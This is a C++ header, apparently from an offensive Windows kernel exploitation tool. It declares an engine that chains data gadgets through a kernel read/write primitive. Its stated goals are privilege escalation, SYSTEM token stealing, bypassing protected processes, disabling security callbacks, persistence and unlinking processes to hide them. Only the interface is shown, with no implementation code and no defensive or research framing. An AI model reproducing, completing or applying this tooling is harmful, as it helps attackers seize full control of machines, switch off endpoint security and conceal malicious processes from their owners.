#pragma once
#include "GadgetDiscovery.h"
#include <vector>
#include <map>
#include <string>
#include <optional>

// Exploit goal types
enum class ExploitGoal {
    PRIVILEGE_ESCALATION,
    BYPASS_PPL,
    DISABLE_SECURITY,
    ARBITRARY_READ,
    ARBITRARY_WRITE,
    CODE_EXECUTION_REDIRECT,
    PERSISTENCE,
    TOKEN_STEALING,
    CALLBACK_DISABLE,
    UNLINK_PROCESS
};

// Gadget chain structure
struct GadgetChain {
    ExploitGoal goal;
    std::string goal_name;
    std::string description;
    std::vector<uint64_t> gadget_addresses;
    std::map<uint64_t, uint64_t> new_values;
    std::map<uint64_t, uint64_t> original_values;
    std::vector<std::pair<uint64_t, uint64_t>> dependencies;
    bool requires_trigger;
    uint64_t trigger_address;
    std::string trigger_type;
    int success_probability;
    std::vector<std::string> steps;
    
    bool IsValid() const { return !gadget_addresses.empty(); }
    size_t Size() const { return gadget_addresses.size(); }
};

// Gadget chaining engine
class GadgetChainingEngine {
private:
    KernelReadWrite* rw;
    std::map<uint64_t, DataGadget> available_gadgets;
    OffsetDatabase offsets;
    
    // Dependency graph
    struct GadgetNode {
        uint64_t address;
        std::vector<uint64_t> depends_on;
        std::vector<uint64_t> triggers;
        bool executed;
        uint64_t result;
    };
    
    std::map<uint64_t, GadgetNode> graph;
    
public:
    GadgetChainingEngine(KernelReadWrite* readWrite);
    
    // Set available gadgets
    void SetAvailableGadgets(const std::map<uint64_t, DataGadget>& gadgets);
    
    // Find chains for various goals
    GadgetChain FindPrivilegeEscalationChain(uint32_t targetPid = 0);
    GadgetChain FindPPLBypassChain(uint32_t targetPid = 0, uint8_t newProt = 0);
    GadgetChain FindDisableSecurityChain();
    GadgetChain FindArbitraryReadChain(uint64_t targetAddr = 0, size_t size = 0);
    GadgetChain FindArbitraryWriteChain(uint64_t targetAddr = 0, uint64_t value = 0);
    GadgetChain FindCodeRedirectChain(uint64_t targetTarget = 0);
    GadgetChain FindTokenStealingChain(uint32_t targetPid = 0);
    GadgetChain FindCallbackDisableChain();
    GadgetChain FindArbitraryWriteFromHandleAccess();
    GadgetChain FindArbitraryReadFromHandleAccess();
    GadgetChain FindUnlinkProcessChain(uint32_t targetPid);
    bool VerifyTokenMatchesSystem(uint32_t pid, uint64_t& targetTok, uint64_t& systemTok);
    
    // Find chain by goal
    GadgetChain FindChainForGoal(ExploitGoal goal);
    
    // Execute chain
    bool ExecuteChain(const GadgetChain& chain);
    bool RestoreChain(const GadgetChain& chain);
    
    // Analyze chains
    std::vector<GadgetChain> FindAllPossibleChains();
    GadgetChain FindOptimalChain(ExploitGoal goal);
    
    // Chain information
    std::string ChainToString(const GadgetChain& chain) const;
    void PrintChain(const GadgetChain& chain) const;
    
private:
    void BuildDependencyGraph();
    std::vector<uint64_t> TopologicalSort(const std::vector<uint64_t>& gadgets);
    
    // Chain building helpers
    GadgetChain BuildTokenStealChain(uint32_t targetPid = 0);
    GadgetChain BuildCallbackRedirectChain();
    GadgetChain BuildHandleElevationChain();
    
    // Helper methods
    std::vector<uint64_t> FindGadgetsByType(GadgetType type) const;
    std::vector<uint64_t> FindGadgetsByPattern(const std::string& pattern) const;
    std::optional<uint64_t> FindFirstWritable(GadgetType type) const;
    uint64_t FindCurrentProcessToken() const;
    uint64_t FindSystemProcessToken() const;
    uint64_t FindSymbolAddress(const std::string& name) const;
    bool IsPPLProcess(uint64_t process) const;
    bool IsSecurityCallback(uint64_t callback) const;
};
